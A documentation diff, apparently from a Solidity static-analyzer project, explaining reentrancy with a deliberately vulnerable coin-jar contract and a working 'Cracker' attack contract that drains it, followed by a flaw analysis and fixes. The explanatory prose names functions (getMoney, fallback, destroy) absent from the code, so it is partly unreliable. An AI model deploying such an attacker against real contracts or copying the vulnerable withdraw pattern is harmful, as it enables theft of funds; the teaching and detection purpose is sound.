@@ -124,6 +124,115 @@ In the first example, <code>vip</code> denotes the copy of the data which we can
 - Write about <code>require</code> and <code>assert</code>.
 - Ocaml project for a Solidity parser, https://gitlab.com/o-labs/solidity-parser-ocaml
 -->
+
+## Reentrancy analysis
+
+The vulnerability due to reentrancy is a major security problem of smart contract.
+
+### Example of reentrancy attack
+
+The following contract, a coin jar, is vulnerable because of the way <code>withdraw()</code> has been implemented.
+```
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.6.12 <0.9.0;
+
+contract VulnerableJar {
+
+    mapping(address=>uint) public balance;
+
+    constructor() payable {
+
+    }
+
+    function deposit() public payable {
+        balance[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        require(balance[msg.sender] != 0, "zero balance");
+        (bool s,) = msg.sender.call{ value: balance[msg.sender] }("");
+        require(s, "In VulnerableJar.withdrow(), call() failed.");
+        balance[msg.sender] = 0;
+    }
+}
+```
+The expected use case is that anybody can make a deposit by calling <code>deposit()</code> with some value, and then can withdraw the deposit by calling <code>withdraw()</code>.
+The problem arises when one uses the following contract <code>Cracker</code> to attack <code>VulnerableJar</code>, assuming the above Solidity code is available as <code>./Jar.sol</col>.
+```
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.6.12 <0.9.0;
+import "./Jar.sol";
+
+contract Cracker {
+
+    VulnerableJar public jar;
+    address public owner;
+
+    constructor(address _jar) payable {
+        jar = VulnerableJar(_jar);
+        owner = msg.sender;
+    }
+
+    function deposit() public {
+        jar.deposit{ value: 1 ether }();
+    }
+
+    function attack() public {
+        jar.withdraw();
+    }
+
+    receive() external payable {
+        if (address(jar).balance >= 1 ether) {
+            jar.withdraw();
+        }
+    }
+
+    function withdraw() public {
+        require (msg.sender == owner);
+        (bool s, ) = owner.call{ value: address(this).balance}("");
+        require (s);
+    }
+}
+```
+By calling <code>getMoney()</code>, it deposits 1 ETH and then immediately starts withdrawing it.
+The execution comes to <code>withdraw</code>, and its <code>call</code> function invokes <code>fallback()</code>; although the parameter is the null string <code>""</code>, the attacker's contract satisfies the condition to get the fallback function executed by the victim contract.
+The fallback function makes another call to <code>withdraw</code> which is the so-called reentrancy.
+As the condition <code>balance[msg.sender] != 0</code> is satisfied, the jar contract again sends 1 ETH to the attacker, and it repeats until the asset balance of the victim goes less than 1 ETH.
+At the end, the attacker calls <code>destroy()</code>, then the contract is deleted and its asset is transferred to the contract owner, namely, the attacker.
+
+### Problem analysis
+
+VulnerableJar sends money to an arbitrary address, that means, anybody who makes a deposit.  Here, there is a possibility of its sending money to an unknown smart contract rather than an EOA (externally owned account).  The prerequisite for successful withdrawal is that the balance <code>balance[msg.sender]</code> is positive.  As the balance is not changed before the actual money transfer, the prerequisite is samely satisfied in case of a reentrancy, hence it repeatedly sends money.  After the attacker stops the process, the the whole transaction will successfully be over without causing a revert; it just assigns <code>0</code> to <code>balance[msg.sender]</code> after all transfers were done.
+
+Based on the above observation, our static program analyzer should issue a warning on a potential vulnerability due to the reentrancy attack, when there is a function which makes a money transfer such as:
+
+1. Preconditions of the money transfer may be satisfied in a recursive call.
+2. After carrying out the money transfer, the transaction may successfully complete.
+
+Note that a use of mutex makes the above 1. unsatisfied, and that Solidity's change (version 0.8 and above) to cause a revert in case of underflow makes 2. unsatisfied.
+
+In fact, a commonly suggested cure for the vulnerability is to make use of mutex to prohibit the reentrancy.  Changing the balance before invoking <code>call</code> is also a solution.  On the other hand, if the business logic were to subtract the amount of the transferred money, it could cause a revert due to the underflow, and as a result, all unexpected sendings could be cancelled.
+
+<!-- and a change of state variables before money transfer  -->
+### Implementation
+
+TODO 
+
+### Notes
+
+TODO
+
+<!-- 1. There is a function, which not only allows reentrancy but also makes a money transfer to some address which may be a smart contract created by somebody.  (May be viewed as a special case of the 2. below.)
+2. In this function, preconditions to the money transfer may be satisfied in a recursive call.
+3. After carrying out the money transfer, it may complete all the recursive function calls without a revert. -->
+
+<!-- variables used to form a condition (maybe no such variable) to decide whether it should send money or not aren't get changed before the line of money transfer. -->
+
+### External links
+
+- https://www.alchemy.com/overviews/reentrancy-attack-solidity
+- https://hackernoon.com/hack-solidity-reentrancy-attack
+
 # Miscellaneous memorandum
 
 The rest of this page is a memorandum for the project.
